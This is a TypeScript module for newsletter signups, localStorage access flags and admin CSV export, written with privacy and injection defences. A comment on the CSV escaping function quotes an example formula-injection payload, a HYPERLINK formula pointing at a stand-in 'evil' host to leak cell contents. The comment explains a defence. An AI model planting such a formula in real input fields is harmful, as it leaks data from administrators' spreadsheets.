/**
 * newsletterApi.ts
 *
 * Manages newsletter / lead-magnet signups.
 *
 * Demo mode  →  in-memory store seeded from DEMO_NEWSLETTER_LEADS
 * Live mode  →  Supabase `newsletter_leads` table
 *
 * Access is tracked in localStorage under `axis_newsletter_access`.
 * Any signup (from any page / source) unlocks all gated lead magnets.
 *
 * Supabase migration: supabase/migrations/015_newsletter_leads.sql
 */

import { supabase, supabaseConfigured } from './supabase'
import { sanitize, sanitizeStrict, sanitizeEmail, isValidEmail } from '../utils/sanitize'
import { DEMO_NEWSLETTER_LEADS } from '../data/demoData'

// ── Types ───────────────────────────────────────────────────────────────────

export interface NewsletterLead {
  id: string
  firstName: string
  lastName: string
  email: string
  source: string       // which page / magnet triggered signup
  createdAt: string
}

export interface NewsletterAccess {
  email: string
  firstName: string
  source: string
  signedUpAt: string
}

// ── Constants ───────────────────────────────────────────────────────────────

const ACCESS_KEY = 'axis_newsletter_access'

// ── In-memory demo store ────────────────────────────────────────────────────

let _demoStore: NewsletterLead[] | null = null

function getDemoStore(): NewsletterLead[] {
  if (!_demoStore) _demoStore = DEMO_NEWSLETTER_LEADS.map(l => ({ ...l }))
  return _demoStore
}

// ── Access helpers (localStorage) ──────────────────────────────────────────
//
// The stored record deliberately omits the EMAIL ADDRESS. Nothing reads it back
// — the only field any caller touches is `firstName`, for the "welcome back"
// line — and an address left in localStorage outlives the visit, survives the
// signup it was collected for, and is readable by anything that ever manages to
// run script on this origin. The subscription itself lives in the database,
// which is where the address belongs; this key is a "they signed up" flag.

/** What is actually persisted — a subset of NewsletterAccess, minus the PII. */
type StoredAccess = Omit<NewsletterAccess, 'email'>

export function getNewsletterAccess(): NewsletterAccess | null {
  try {
    const raw = localStorage.getItem(ACCESS_KEY)
    if (!raw) return null
    const parsed = JSON.parse(raw) as Partial<NewsletterAccess>
    if (typeof parsed.firstName !== 'string') return null
    // Older records carry an address from before it stopped being written.
    // Reading one is the moment to get rid of it rather than the moment to
    // start trusting it, so it is dropped here and rewritten without it.
    if (typeof parsed.email === 'string' && parsed.email) {
      writeAccess(parsed as NewsletterAccess)
    }
    return { ...(parsed as StoredAccess), email: '' }
  } catch { return null }
}

function writeAccess(access: NewsletterAccess) {
  const stored: StoredAccess = {
    firstName:  access.firstName,
    source:     access.source,
    signedUpAt: access.signedUpAt,
  }
  localStorage.setItem(ACCESS_KEY, JSON.stringify(stored))
}

export function clearNewsletterAccess() {
  localStorage.removeItem(ACCESS_KEY)
}

// ── Public API ───────────────────────────────────────────────────────────────

/**
 * Subscribe a new newsletter lead.
 * Writes access to localStorage regardless of mode.
 * Deduplicates by email (throws if already subscribed).
 */
export async function subscribeNewsletter(
  data: { firstName: string; lastName: string; email: string; source: string },
  isDemo: boolean,
): Promise<NewsletterLead> {
  const firstName = sanitizeStrict(data.firstName.trim()).slice(0, 100)
  const lastName  = sanitizeStrict(data.lastName.trim()).slice(0, 100)
  // sanitizeEmail, not sanitize: the general one escapes `&` and `'` into HTML
  // entities, so an address containing either was stored — and mailed to —
  // mangled. Both strip tags and cap the length; only one leaves an address
  // still deliverable.
  const email     = sanitizeEmail(data.email.trim().toLowerCase())
  const source    = sanitize(data.source.trim(), 100) || 'guides_page'

  if (!firstName || !email || !isValidEmail(email)) {
    throw new Error('Please enter a valid first name and email address.')
  }

  let lead: NewsletterLead

  if (supabaseConfigured && !isDemo) {
    // Check for existing
    const { data: existing } = await supabase
      .from('newsletter_leads')
      .select('id')
      .eq('email', email)
      .maybeSingle()

    if (existing) {
      // Already subscribed — still grant access
      const access: NewsletterAccess = { email, firstName, source, signedUpAt: new Date().toISOString() }
      writeAccess(access)
      throw new Error('You\'re already subscribed! Your access has been restored.')
    }

    const { data: inserted, error } = await supabase
      .from('newsletter_leads')
      .insert([{ first_name: firstName, last_name: lastName, email, source }])
      .select()
      .single()
    if (error) throw new Error(error.message)

    const row = inserted as Record<string, unknown>
    lead = {
      id:        String(row.id),
      firstName: String(row.first_name),
      lastName:  String(row.last_name),
      email:     String(row.email),
      source:    String(row.source),
      createdAt: String(row.created_at),
    }
  } else {
    // Demo mode: in-memory
    const store = getDemoStore()
    if (store.some(l => l.email === email)) {
      const access: NewsletterAccess = { email, firstName, source, signedUpAt: new Date().toISOString() }
      writeAccess(access)
      throw new Error('You\'re already subscribed! Your access has been restored.')
    }
    lead = {
      id:        Math.random().toString(36).slice(2, 12),
      firstName,
      lastName,
      email,
      source,
      createdAt: new Date().toISOString(),
    }
    store.push(lead)
  }

  writeAccess({ email, firstName, source, signedUpAt: new Date().toISOString() })
  return lead
}

/** Fetch all newsletter leads — admin only. */
export async function fetchNewsletterLeads(isDemo: boolean): Promise<NewsletterLead[]> {
  if (!supabaseConfigured || isDemo) return [...getDemoStore()]

  const { data, error } = await supabase
    .from('newsletter_leads')
    .select('*')
    .order('created_at', { ascending: false })
  if (error) throw new Error(error.message)

  return (data ?? []).map((row: Record<string, unknown>) => ({
    id:        String(row.id),
    firstName: String(row.first_name),
    lastName:  String(row.last_name),
    email:     String(row.email),
    source:    String(row.source ?? 'guides_page'),
    createdAt: String(row.created_at),
  }))
}

/**
 * One CSV cell, escaped for both the file format and the thing that opens it.
 *
 * Two separate problems, and the old `"${value}"` handled neither. A value
 * containing a double quote ends its own field and shifts every column after
 * it — CSV escapes a quote by doubling it. And a value STARTING with `=`, `+`,
 * `-` or `@` is a formula to Excel and Sheets, so a subscriber who signs up as
 * `=HYPERLINK("http://evil/"&A1,"click")` gets that executed on the admin's
 * machine when they open the export. Prefixing with an apostrophe makes the
 * spreadsheet treat it as text, which is what a name has always been.
 */
function csvCell(value: string): string {
  const raw = String(value ?? '')
  const escaped = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
  return `"${escaped.replace(/"/g, '""')}"`
}

/** Generate and download a CSV of newsletter leads. */
export function exportNewsletterCsv(leads: NewsletterLead[]) {
  const headers = ['First Name', 'Last Name', 'Email', 'Source', 'Signed Up'].join(',')
  const rows = leads.map(l => [
    csvCell(l.firstName),
    csvCell(l.lastName),
    csvCell(l.email),
    csvCell(l.source),
    csvCell(new Date(l.createdAt).toLocaleDateString('en-US')),
  ].join(','))

  const csv = [headers, ...rows].join('\n')
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' })
  const url  = URL.createObjectURL(blob)
  const a    = document.createElement('a')
  a.href     = url
  a.download = `axis_newsletter_${new Date().toISOString().split('T')[0]}.csv`
  a.click()
  URL.revokeObjectURL(url)
}
